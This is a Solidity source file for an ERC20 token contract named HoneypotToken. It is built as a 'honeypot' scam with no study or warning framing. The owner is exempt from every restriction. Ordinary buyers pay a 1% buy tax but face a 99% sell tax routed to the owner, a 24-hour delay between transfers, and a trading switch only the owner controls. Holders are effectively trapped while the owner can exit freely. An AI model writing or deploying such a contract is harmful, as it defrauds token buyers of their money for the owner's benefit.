// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract HoneypotToken is ERC20, Ownable {
    mapping(address => bool) public isExcludedFromFees;
    mapping(address => uint256) public lastTransferTime;
    
    uint256 public sellTax = 99; // 99% tax on sells
    uint256 public buyTax = 1;   // 1% tax on buys
    uint256 public transferDelay = 24 hours; // 24 hour delay between transfers
    
    bool public tradingEnabled = false;
    address public uniswapPair;
    
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000000 * 10**decimals()); // 1B tokens
        isExcludedFromFees[msg.sender] = true;
    }
    
    function enableTrading() external onlyOwner {
        tradingEnabled = true;
    }
    
    function setUniswapPair(address _pair) external onlyOwner {
        uniswapPair = _pair;
    }
    
    function excludeFromFees(address account, bool excluded) external onlyOwner {
        isExcludedFromFees[account] = excluded;
    }
    
    function _transfer(address from, address to, uint256 amount) internal override {
        require(tradingEnabled || isExcludedFromFees[from], "Trading not enabled");
        
        // Apply transfer delay (except for owner)
        if (!isExcludedFromFees[from]) {
            require(block.timestamp >= lastTransferTime[from] + transferDelay, "Transfer too soon");
            lastTransferTime[from] = block.timestamp;
        }
        
        uint256 taxAmount = 0;
        
        // Calculate tax
        if (!isExcludedFromFees[from] && !isExcludedFromFees[to]) {
            if (to == uniswapPair) {
                // Selling - apply high tax
                taxAmount = (amount * sellTax) / 100;
            } else if (from == uniswapPair) {
                // Buying - apply low tax
                taxAmount = (amount * buyTax) / 100;
            }
        }
        
        if (taxAmount > 0) {
            super._transfer(from, owner(), taxAmount);
            amount -= taxAmount;
        }
        
        super._transfer(from, to, amount);
    }
    
    // Function to distribute tokens to users
    function distributeTokens(address[] calldata recipients, uint256[] calldata amounts) external onlyOwner {
        require(recipients.length == amounts.length, "Arrays length mismatch");
        
        for (uint256 i = 0; i < recipients.length; i++) {
            _transfer(owner(), recipients[i], amounts[i] * 10**decimals());
        }
    }
}